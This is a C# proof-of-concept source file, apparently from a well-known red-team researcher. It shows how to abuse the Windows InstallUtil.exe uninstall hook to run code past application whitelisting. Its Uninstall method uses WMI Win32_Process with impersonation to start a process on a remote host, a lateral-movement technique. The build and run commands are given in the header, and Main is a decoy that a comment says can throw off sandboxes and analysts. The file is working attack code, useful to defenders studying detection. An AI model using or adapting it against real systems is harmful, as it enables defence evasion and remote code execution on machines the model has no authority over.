using System;
using System.Management;

/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause
Step One:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe mimic.cs
Step Two:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U mimic.exe

Reference: https://msdn.microsoft.com/en-us/library/bb404655.aspx
*/

public class Program
	{
		public static void Main()
		{
			Console.WriteLine("Hello From Main...I Don't Do Anything");
			//Add any behaviour here to throw off sandbox execution/analysts :)

		}
		
	}
	
[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
	//The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
	public override void Uninstall(System.Collections.IDictionary savedState)
	{
	
		Console.WriteLine("Hello There From Uninstall");
		Mimic.Exec("calc.exe");
		
	}
	
}

public class Mimic

{
	public static void Exec(string cmd)
	{
		try
		{
		var processToRun = new[] { cmd };
		var connection = new ConnectionOptions();
		connection.Impersonation = ImpersonationLevel.Impersonate;
		connection.EnablePrivileges = true;
		var wmiScope = new ManagementScope(String.Format("\\\\{0}\\root\\cimv2", "[REMOTE-NAME]"), connection);
		var wmiProcess = new ManagementClass(wmiScope, new ManagementPath("Win32_Process"), new ObjectGetOptions());
		wmiProcess.InvokeMethod("Create", processToRun);
		}
		catch (Exception e)
		{
			Console.WriteLine(e.Message);
		}
	}
}

